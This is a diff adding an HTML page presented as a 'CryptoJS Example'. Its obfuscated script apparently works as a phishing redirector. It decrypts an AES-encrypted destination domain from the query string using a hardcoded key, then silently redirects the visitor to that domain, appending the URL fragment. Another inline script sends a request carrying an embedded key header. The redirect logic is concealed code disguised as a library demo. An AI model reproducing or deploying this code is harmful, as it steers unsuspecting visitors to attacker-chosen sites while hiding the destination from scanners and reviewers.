@@ -1,0 +1,14 @@
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<title>CryptoJS</title>
+<meta name="description" content="CryptoJs Example">
+<meta name="author" content="Gabriel Porras">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/rollups/aes.js"></script>
+</head>
+<body>
+<script type="text/javascript">fetch(window.location.href,{method:"GET",headers:{"ts-request-embed-key":"de43325f-149d-46ea-ae12-21352d7cb23c:b53783392e2ca93b1555deb78c5c225922818ab03fb0561b8532a50273f38b0d"}});</script></body>
+<script>
+function _0x3fc2(_0x51881d,_0x165afd){var _0x48bc39=_0x48bc();return _0x3fc2=function(_0x3fc2d8,_0x57d207){_0x3fc2d8=_0x3fc2d8-0x14f;var _0x3687c4=_0x48bc39[_0x3fc2d8];return _0x3687c4;},_0x3fc2(_0x51881d,_0x165afd);}var _0x1522c3=_0x3fc2;function _0x48bc(){var _0x5c4efe=['100755wKxicp','decrypt','5502429fOSMkD','replace','1548312ffDCGw','toString','split','6QAIPYb','48csdtNl','546792GMHqRm','2909732kYYuPH','Utf8','866468VpEAnj','1052584lOzGWo','location','z57wvHt8fkuS73Jy','hash'];_0x48bc=function(){return _0x5c4efe;};return _0x48bc();}(function(_0x12fd6b,_0x207e65){var _0x34529b=_0x3fc2,_0x25bf80=_0x12fd6b();while(!![]){try{var _0x5e18d9=parseInt(_0x34529b(0x15b))/0x1+-parseInt(_0x34529b(0x15e))/0x2+parseInt(_0x34529b(0x156))/0x3+parseInt(_0x34529b(0x15a))/0x4*(-parseInt(_0x34529b(0x152))/0x5)+-parseInt(_0x34529b(0x159))/0x6*(-parseInt(_0x34529b(0x15c))/0x7)+parseInt(_0x34529b(0x15f))/0x8+-parseInt(_0x34529b(0x154))/0x9;if(_0x5e18d9===_0x207e65)break;else _0x25bf80['push'](_0x25bf80['shift']());}catch(_0x3edb12){_0x25bf80['push'](_0x25bf80['shift']());}}}(_0x48bc,0x4f086),domainCrypted=window['location']['search'][_0x1522c3(0x158)]('=')[0x1],domainName=CryptoJS['AES'][_0x1522c3(0x153)](domainCrypted,_0x1522c3(0x150)),window[_0x1522c3(0x14f)][_0x1522c3(0x155)](domainName[_0x1522c3(0x157)](CryptoJS['enc'][_0x1522c3(0x15d)])+'/'+window[_0x1522c3(0x14f)][_0x1522c3(0x151)][_0x1522c3(0x158)]('#')[0x1]));
+</script>
+</html>
